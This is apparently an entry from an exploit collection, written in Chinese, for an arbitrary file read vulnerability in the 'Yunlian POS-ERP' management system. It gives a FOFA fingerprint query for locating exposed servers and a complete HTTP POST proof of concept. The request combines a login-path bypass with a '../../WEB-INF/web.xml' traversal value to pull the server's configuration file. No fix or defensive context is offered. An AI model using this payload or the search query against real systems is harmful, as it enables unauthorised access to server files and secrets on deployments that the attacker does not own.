# 云连POS-ERP管理系统downloadFile存在任意文件读取漏洞

云连POS-ERP管理系统downloadFile存在任意文件读取漏洞

## fofa
```javascript
title="Powered By chaosZ"
```

## poc
```javascript
POST /admin/file!download.action;admin!login.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close
 
downloadFile=../../WEB-INF/web.xml
```

![image-20241219151235140](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191512200.png)